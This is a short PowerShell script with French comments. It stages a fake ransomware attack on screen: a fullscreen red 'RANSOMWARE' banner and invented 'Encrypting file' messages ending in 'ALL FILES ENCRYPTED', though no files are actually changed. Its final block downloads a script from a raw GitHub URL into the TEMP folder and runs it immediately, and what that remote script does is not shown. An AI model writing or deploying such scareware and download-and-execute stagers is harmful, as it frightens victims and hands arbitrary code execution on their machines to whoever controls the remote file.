# --- EFFET VISUEL ---
$wsh = New-Object -ComObject WScript.Shell
$wsh.SendKeys("%{ENTER}")

$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Red"
Clear-Host


Write-Host "=========================================" -ForegroundColor Red
Write-Host "             RANSOMWARE                  " -ForegroundColor Red
Write-Host "=========================================" -ForegroundColor Red
Write-Host ""
Start-Sleep -Milliseconds 500

1..15 | ForEach-Object {
    Write-Host "[+] Encrypting file_$_.docx" -ForegroundColor Red
    Start-Sleep -Milliseconds 150
}

Write-Host ""
Start-Sleep -Milliseconds 300
Write-Host "[!] ALL FILES ENCRYPTED" -ForegroundColor Yellow
Write-Host ""
Start-Sleep -Milliseconds 800

# --- TELECHARGEMENT ET EXECUTION ---
$url = "https://raw.githubusercontent.com/asmaerouel/MesTest/refs/heads/main/test1.ps1"
$file = "$env:TEMP\github-script.ps1"
Invoke-WebRequest -Uri $url -OutFile $file
& $file